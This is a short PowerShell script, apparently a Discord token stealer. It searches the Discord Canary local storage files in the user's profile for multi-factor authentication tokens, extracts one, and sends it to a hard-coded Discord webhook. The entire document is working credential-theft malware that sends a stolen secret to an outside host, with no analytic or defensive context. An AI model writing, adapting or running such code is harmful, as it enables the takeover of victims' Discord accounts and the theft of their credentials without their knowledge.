$path = $env:USERPROFILE
$web = "https://ptb.discord.com/api/webhooks/890094345619906581/WFcd8dHuhpSAEAKMRfsv7LfilfK9DugugBmMRl4QopTaPhl-Tb-sT3YcXAZ0xXsmJi3c"
$userp = Select-String -Path "$path\AppData\Roaming\discordcanary\Local Storage\Leveldb\*.ldb" -Pattern 'mfa.'

$array = $userp -Split '"'

for (($i = 0); $i -lt $array.count; $i++)
{
    if ($array[$i].Contains('mfa.')){
        $token = $array[$i]

    }
}

Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"$token`"}"